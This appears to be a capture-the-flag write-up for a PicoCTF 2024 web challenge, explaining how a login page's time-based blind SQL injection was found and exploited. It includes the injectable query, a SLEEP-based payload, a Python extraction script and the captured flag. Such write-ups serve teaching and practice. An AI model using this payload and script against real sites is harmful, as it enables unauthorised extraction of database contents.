  <div class="post-content">
    <p>During the PicoCTF 2024 competition, we encountered a challenging web exploitation challenge called "Secure Login". This write-up details our approach, the vulnerability discovered, and how we successfully captured the flag.</p>

    <h2>Challenge Description</h2>
    <p>The challenge presented a login page claiming to be "unbreakable" with multiple layers of security. The objective was to bypass the authentication mechanism and retrieve the flag stored in the database.</p>

    <h2>Initial Reconnaissance</h2>
    <p>First, we analyzed the HTTP requests using Burp Suite and discovered interesting behavior:</p>
    <pre><code>POST /login HTTP/1.1
Host: secure-login.challenge.picoctf.net
Content-Type: application/x-www-form-urlencoded

username=admin&password=test</code></pre>

    <p>The server responded with a generic error message: "Invalid credentials". However, we noticed a difference in response time depending on the username provided.</p>

    <h2>Identifying the Vulnerability</h2>
    <p>After further testing, we discovered that the application was vulnerable to <strong>SQL Injection</strong> with <strong>time-based blind exploitation</strong>. The backend query appeared to be:</p>
    <pre><code>SELECT * FROM users WHERE username = '$username' AND password = '$password'</code></pre>

    <p>We crafted a payload to extract the flag character by character:</p>
    <pre><code>admin' AND IF(SUBSTRING((SELECT flag FROM flags),1,1)='p', SLEEP(5), 0) --</code></pre>

    <h2>Exploitation Process</h2>
    <p>Using a Python script, we automated the extraction process:</p>
    <pre><code>import requests
import time

url = "https://secure-login.challenge.picoctf.net/login"
flag = ""
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"

for i in range(1, 50):
    for c in charset:
        payload = f"admin' AND IF(SUBSTRING((SELECT flag FROM flags),{i},1)='{c}', SLEEP(5), 0) --"
        start = time.time()
        requests.post(url, data={"username": payload, "password": "anything"})
        elapsed = time.time() - start
        
        if elapsed > 4:
            flag += c
            print(f"[+] Flag: {flag}")
            break
    else:
        break

print(f"Final flag: {flag}")</code></pre>

    <h2>Result</h2>
    <p>After approximately 2 minutes of extraction, we obtained the flag:</p>
    <pre><code>picoCTF{tim3_b4s3d_5ql_1nJ3ct10n_15_5t1ll_d4ng3r0u5_8f5e9a2c}</code></pre>

